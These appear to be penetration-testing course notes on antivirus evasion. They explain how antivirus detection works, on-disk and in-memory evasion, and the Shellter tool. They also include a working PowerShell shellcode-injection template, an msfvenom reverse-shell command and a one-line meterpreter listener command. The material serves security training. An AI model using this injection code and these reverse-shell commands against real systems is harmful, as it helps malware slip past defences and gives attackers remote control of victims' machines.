---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Module 14: Antivirus Evasion

## Antivirus Software Key Components and Operations

### Known vs Unknown Threats

### AV Engines and Components

### Detection Methods

* Signature-based Detection
  * Considered a _restricted list technology_. Can be a hash, specific values, strings, etc.
* Heuristic-based Detection
  * Various rules and algorithms determine whether an action is considered malicious. Often by stepping through the instruction set of the binary.
* Behavioral Detection
  * Analyzing the behavior, often by executing the file in an emulated environment, searching for behaviors/actions that are considered malicious.
* Machine Learning Detection
  * Introducing ML algorithms to detect unknown threats by collecting and analyzing additional metadata.

## Bypassing Antivirus Detections

### On-Disk Evasion

Highly effecting AV evasion requires a combination of packers, obfuscators, crypters, anti-reversing, anti-debuffing, virtual machine emulation detection, and so on. Software protectors were designed for legit purposes, like _anti-copy_ but can also be used for AV evasion.

### In-Memory Evasion

_In-Memory Injections_ also known as _PE Injections_ are great for bypassing AV. It doesn't write to disk. \
&#xNAN;_&#x52;emote Process Memory Injection_ - injecting a payload into a valid, non-malicious PE. This can be done via _Windows APIs:_

1. _OpenProcess_ to obtain a handle.
2. _VirtualAllocEx_ to allocate memory in the context of that process.
3. _WriteProcessMemory_ to copy the malicious payload to newly allocated memory.
4. _CreateRemoteThread_ to execute it.

## AV Evasion in Practice

### Testing for AV Evasion

VirusTotal: Submitting samples to see how AV detects it. This provides the sample to the partners though.\
AntiScan.me: Supposedly does not share samples; tests with 30 AVs and has four free scans per day.

### Evading AV with Thread Injection

A basic templated script that performs in-memory injection is shown below, shellcode could be generated via `msfvenom -p windows/shell_reverse_tcp LHOST=your.listener.ip.here LPORT=port -f powershell -v sc`:

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

### Automating the Process

_**Shellter**_ is a dynamic shellcode injection tool and one of the most popular free tools capable of bypassing AV. Ensure architecture **i386** is added and that **wine32** is installed. Then you can run `shellter`.\
Shellter can run in either _Auto_ or _Manual_ mode.

Manual: The tool will launch the PE we want to use for injection and allow us to manipulate it on a more granular level.\
Auto: The tool will automatically attempt to fully inject the malicious code into the PE.\
Stealth: attempt to restore the execution flow of the PE after our payload has been executed.

Kicking off a meterpreter listener in one line: `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST your.listener.ip.here;set LPORT port;run;"`
